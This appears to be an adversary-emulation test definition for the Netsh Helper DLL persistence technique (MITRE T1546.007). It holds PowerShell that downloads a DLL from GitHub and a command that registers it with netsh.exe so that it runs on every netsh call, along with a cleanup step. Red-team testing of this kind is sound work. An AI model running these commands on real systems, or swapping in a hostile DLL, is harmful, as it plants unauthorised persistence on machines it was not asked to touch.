api_version: "2.0"
name: Netsh Helper DLL Registration
description: |
    You can register a "helper dll" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.
    The NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.

    [Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)
    [Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)
args:
    - name: helper_file
      type: path
      default: PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll
uuid: 3244697d-5a3a-4dfc-941c-550f69f91a4d
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0003: Persistence'
    techniques:
        - 'T1546: Event Triggered Execution'
    subtechniques:
        - 'T1546.007: Netsh Helper DLL'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Helper DLL must exist on disk at specified location (#{helper_file})
      inline: |
        if (Test-Path "#{helper_file}") { exit 0} else { {New-Item -Type Directory (split-path "#{helper_file}") -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.007/bin/NetshHelper.dll" -OutFile "#{helper_file}"
        }}
      executor: powershell
    - name: netsh-helper-dll-registration
      inline: |
        netsh.exe add helper "{{.Args.helper_file}}"
        taskkill /im notepad.exe /t /f > NUL 2>&1
      executor: command_prompt
      cleanup:
        inline: |
            netsh.exe delete helper "{{.Args.helper_file}}"
        executor: command_prompt
